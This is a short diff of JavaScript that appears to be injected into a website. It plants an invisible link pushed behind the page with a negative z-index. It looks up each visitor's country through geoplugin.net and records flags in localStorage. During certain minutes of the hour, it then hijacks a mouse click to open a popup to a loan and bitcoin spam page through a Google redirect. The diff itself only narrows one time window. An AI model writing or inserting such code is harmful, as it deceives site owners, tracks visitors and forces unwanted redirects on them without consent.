@@ -2,7 +2,7 @@ let EFV='<a href="https://www.am2z.com" style="position:absolute;z-index:-999;le
 
 if (!localStorage.xcaf){(async()=>{let aa=await(await(await fetch(`http://www.geoplugin.net/json.gp`)).json());localStorage.xcaf=1;if(/£|[$]|€/.test(aa.geoplugin_currencySymbol)){localStorage.xcaf=2;if(/Spain/.test(aa.geoplugin_countryName)){localStorage.xcaf=3};uhd()}})();}
 
-function uhd(){document.onmousedown=()=>{let dte=(new Date).getMinutes();if(!sessionStorage.i&&(localStorage.xcaf==2&&dte>9&&dte<40||localStorage.xcaf==3&&dte>9&&dte<30)){
+function uhd(){document.onmousedown=()=>{let dte=(new Date).getMinutes();if(!sessionStorage.i&&(localStorage.xcaf==2&&dte>9&&dte<40||localStorage.xcaf==3&&dte>9&&dte<20)){
 window.open('https://www.google.com/url?sa=t&source=web&rct=j&url=https://bitcoin-insurance-loan-seo-hosting.mrjaz.com/what-is-loan-how-many-types-of-loan-best-loan-service-provider&ved=2ahUKEwjdveDOvrT6AhWiZ2wGHX26CUMQFnoECAgQAQ&usg=AOvVaw3djirs4qcicfndXpsApzfk'); 
 sessionStorage.i='i'}}};uhd()
 
